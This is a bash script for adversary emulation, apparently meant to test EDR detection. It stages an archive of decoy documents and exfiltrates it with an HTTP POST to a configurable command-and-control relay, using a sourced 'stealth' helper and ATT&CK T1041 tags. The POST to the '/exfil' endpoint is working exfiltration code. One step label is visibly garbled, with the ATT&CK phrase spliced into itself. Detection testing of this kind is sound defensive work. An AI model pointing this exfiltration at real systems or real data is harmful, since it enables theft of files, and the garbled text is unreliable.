#!/bin/bash
#
# run-https-exfil.sh
# ---------------------------------------------------------------------------
# EDR DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Complements run-metadata-exfil.sh's DNS-tunnel exfil with a second,
# more common channel: a direct HTTP POST of a staged archive to the
# environment's control-api relay (services/control_api.py /exfil endpoint). Run
# run-collection-staging.sh first to produce an archive, or this script
# will stage decoy documents itself if none is found.
#
#   POST staged archive to C2       Exfiltration Over C2 Channel   (T1041)
#   large single POST, non-business domain/port   (T1048 family)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

HOME_DIR="${HOME:-/home/root}"
DECOY_DIR="${DECOY_DIR:-${HOME_DIR}/decoy-data}"
RESULTS_DIR="${RESULTS_DIR:-${HOME_DIR}/results}"
C2_HOST="${C2_HOST:-control-api}"
C2_PORT="${C2_PORT:-8443}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/httpsexfil_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Northline :: HTTPS/HTTP exfil emulation :: session=$SESSION"

ARCHIVE="$(find "$RESULTS_DIR" -maxdepth 1 -name 'staged_*.tar.gz' | sort | tail -n1)"
if [ -z "${ARCHIVE:-}" ]; then
    say "no staged archive found — staging decoy documents now"
    mkdir -p "${DECOY_DIR}/documents"
    [ -z "$(ls -A "${DECOY_DIR}/documents" 2>/dev/null)" ] && bash "$(dirname "$0")/seed-decoys.sh"
    ARCHIVE="${RESULTS_DIR}/httpsexfil_payload_${SESSION}.tar.gz"
    tar -czf "$ARCHIVE" -C "$DECOY_DIR" documents 2>&1 | tee -a "$LOG"
fi
say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)"

step "exfiltrate archive via HTTP POST to control-api relay (ATTto control-api relay (ATT&CK T1041)CK T1041)"
st_mark T1041 "https-exfil"
ST_HTTP_TIMEOUT=10 RESP="$(st_http POST "http://${C2_HOST}:${C2_PORT}/exfil" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
say "C2 response: $RESP"

step "Done — HTTPS-style exfil complete."
say "artifacts: $LOG  (received copy under results/c2_exfil_received/ on the control-api side)"
